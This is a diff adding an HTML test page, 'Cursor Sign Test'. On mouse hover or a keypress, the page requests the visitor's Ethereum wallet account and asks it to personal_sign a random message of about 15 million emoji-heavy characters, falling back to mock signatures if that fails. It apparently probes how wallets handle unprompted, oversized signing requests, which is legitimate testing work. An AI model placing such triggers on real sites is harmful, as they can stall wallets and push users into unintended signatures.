@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Cursor Sign Test</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      padding: 32px;
+    }
+    .card {
+      background: #0f1720;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 900px;
+      margin: 0 auto;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+    }
+    h1 { margin: 0 0 8px 0; font-size: 20px; }
+    p { margin: 0 0 12px 0; color: #bfc9d9; }
+    pre {
+      margin-top: 12px;
+      background: #071021;
+      padding: 12px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 360px;
+      overflow: auto;
+      color: #e6eef8;
+    }
+    .warn { color: #ffcc00; margin-top: 8px; }
+    .good { color: #7ee787; }
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <h1>Cursor Sign Test</h1>
+    <p>Move your cursor over the page to initiate the signing process via <code>onmouseover</code>.</p>
+    <p class="warn">Warning: Wallets typically need a click/keyboard gesture. If blocked, the page switches to <strong>mock</strong> mode for testing.</p>
+    <p>Test message length is set to <code>TEST_MESSAGE_LENGTH = 15000000</code>. Adjust with caution (large values may stall your browser).</p>
+    <pre id="output">Ready. Hover your cursor over this page to activate the handler.</pre>
+  </div>
+
+  <script>
+    // CONFIG
+    const TEST_MESSAGE_LENGTH = 15000000; // Increased to 15M characters
+    const SIGN_COUNT = 1; // Number of signing attempts
+
+    const outEl = document.getElementById('output');
+
+    function log(...args) {
+      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
+      outEl.textContent += line + "\n";
+      outEl.scrollTop = outEl.scrollHeight;
+      console.log(...args);
+    }
+
+    // Prepare the message with mixed characters and emojis
+    let testMessage = null;
+    window.addEventListener('load', () => {
+      log(`Preparing message of length ${TEST_MESSAGE_LENGTH}...`);
+      const chars = ['a', 'b', '☠️', '😈'];
+      testMessage = new Array(Math.floor(TEST_MESSAGE_LENGTH / 4))
+        .fill()
+        .map(() => chars[Math.floor(Math.random() * chars.length)])
+        .join('');
+      log('Message prepared. Hover your cursor to start the signing process.');
+    });
+
+    // Mock-sign function for testing without a wallet
+    function mockSign(index) {
+      const fakeSig = `0xMOCKSIG_${index}_${Math.random().toString(36).slice(2,10)}`;
+      return Promise.resolve(fakeSig);
+    }
+
+    // Attempt real signing with fallback to mock
+    async function trySign(index, fromAddress) {
+      if (!window.ethereum) {
+        log(`No wallet detected — using mock signature for #${index}`);
+        return mockSign(index);
+      }
+
+      try {
+        const sig = await ethereum.request({
+          method: 'personal_sign',
+          params: [testMessage, fromAddress],
+        });
+        return sig;
+      } catch (err) {
+        log(`Real sign attempt #${index} failed: ${err && err.message ? err.message : err}. Falling back to mock.`);
+        return mockSign(index);
+      }
+    }
+
+    // Batch signing routine
+    async function signBatchHover() {
+      document.body.removeEventListener('mouseover', hoverHandler); // Prevent re-trigger
+
+      outEl.textContent = ''; // Clear output
+      log('Cursor detected. Starting signBatchHover...');
+
+      if (!window.ethereum) {
+        log('🚨 No window.ethereum detected. Using mock mode for all signatures.');
+        for (let i = 1; i <= SIGN_COUNT; i++) {
+          const msig = await mockSign(i);
+          log(`✅ Mock signed [${i}]: ${msig}`);
+        }
+        log('Finished mock-signing.');
+        return;
+      }
+
+      let accounts;
+      try {
+        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      } catch (err) {
+        log('Account request failed (likely due to untrusted gesture). Switching to mock mode. Error:', err.message || err);
+        for (let i = 1; i <= SIGN_COUNT; i++) {
+          const msig = await mockSign(i);
+          log(`✅ Mock signed [${i}]: ${msig}`);
+        }
+        log('Finished mock-signing after failed account request.');
+        return;
+      }
+
+      const from = accounts && accounts[0];
+      log(`Connected account: ${from}`);
+
+      for (let i = 1; i <= SIGN_COUNT; i++) {
+        log(`Attempting sign #${i}...`);
+        const sig = await trySign(i, from);
+        log(`✅ Result for #${i}: ${sig}`);
+      }
+
+      log('Completed signing attempts.');
+
+      document.body.addEventListener('mouseover', hoverHandler); // Re-attach listener
+    }
+
+    // Debounced hover handler with shorter delay
+    let hoverTimeout = null;
+    function hoverHandler() {
+      if (hoverTimeout) return;
+      hoverTimeout = setTimeout(() => {
+        hoverTimeout = null;
+        signBatchHover().catch(err => {
+          log('Unexpected error in signBatchHover:', err && err.message ? err.message : err);
+          document.body.addEventListener('mouseover', hoverHandler); // Reattach on error
+        });
+      }, 100); // Reduced to 100ms for faster response
+    }
+
+    // Attach the hover handler on page load
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.addEventListener('mouseover', hoverHandler); // Use mouseover instead of mousemove
+    });
+
+    // Keyboard trigger for trusted gesture
+    window.addEventListener('keydown', async (e) => {
+      if (e.key === 'c' || e.key === 'C') {
+        log('User pressed C: initiating click-style signing (trusted gesture).');
+        await signBatchHover();
+      }
+    });
+  </script>
+</body>
+</html>
